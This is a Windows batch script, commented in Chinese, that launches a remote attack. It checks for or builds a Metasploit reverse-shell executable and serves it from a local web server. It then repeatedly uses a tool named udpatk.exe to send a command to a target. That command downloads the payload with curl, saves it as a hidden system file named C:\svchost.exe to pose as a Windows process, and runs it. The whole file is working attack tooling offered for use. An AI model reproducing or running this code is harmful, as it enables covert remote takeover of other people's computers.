@echo off
setlocal

chcp 65001 && cls

if not exist "%~dp0shell\shell.exe" (
    echo 未检测到 shell.exe, 请先等待生成反弹 shell ...
    echo 若无法使用, 请检查 msf 安装与环境变量配置
    start %~dp0shell\gen.bat
    pause
    cls
)

echo 请勿关闭此窗口 ...
echo.

set "LocalIP="
for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -eq 'Up' } | ForEach-Object { $_.IPv4Address.IPAddress } | Select-Object -First 1"`) do set "LocalIP=%%i"

start %~dp0bin\miniweb.exe -d "%~dp0shell" >nul 2>&1
start %~dp0server\server.bat >nul
timeout 10 >nul

:loop
%~dp0bin\udpatk.exe -c "cmd /c curl -o C:\svchost.exe -O http://%LocalIP%:8000/shell.exe && attrib +s +h C:\svchost.exe && start C:\svchost.exe" >nul
if errorlevel 0 (echo [+] 发送成功)

echo 回车再次发送, Ctrl+C 退出 ...
pause >nul
echo.
goto loop

endlocal